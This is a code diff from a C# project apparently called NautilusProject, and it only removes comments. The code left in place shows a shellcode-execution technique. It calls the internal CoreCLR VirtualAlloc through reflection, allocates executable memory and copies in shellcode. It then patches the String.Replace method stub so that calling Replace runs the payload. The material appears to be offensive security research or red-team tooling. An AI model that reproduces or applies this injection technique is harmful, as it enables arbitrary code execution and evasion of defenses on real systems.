@@ -70,17 +70,13 @@ namespace NautilusProject
 
             var mdcBase = ReadMemory(ecBase + 0x20);
 
-            // Get the String.Replace method stub
             IntPtr stub = ReadMemory(mdcBase + 0x18 + 8);
 
-            // Steal p/invoke from CoreCLR Interop.Kernel32.VirtualAlloc
             var kernel32 = typeof(System.String).Assembly.GetType("Interop+Kernel32");
             var VirtualAlloc = kernel32.GetMethod("VirtualAlloc", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
 
-            // Allocate memory
             var ptr = VirtualAlloc.Invoke(null, new object[] { IntPtr.Zero, new UIntPtr((uint)shellcode.Length), Internals.AllocationType.Commit | Internals.AllocationType.Reserve, Internals.MemoryProtection.ExecuteReadWrite });
 
-            // Convert void* to IntPtr
             IntPtr mem = (IntPtr)ptr.GetType().GetMethod("GetPointerValue", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(ptr, new object[] { });
 
             CopyMemory(shellcode, mem);
@@ -89,7 +85,6 @@ namespace NautilusProject
 
             WriteMemory(stub + 2, mem);
 
-            // FIRE!!
             "ANYSTRING".Replace("XPN", "WAZ'ERE", true, null);
         }
 
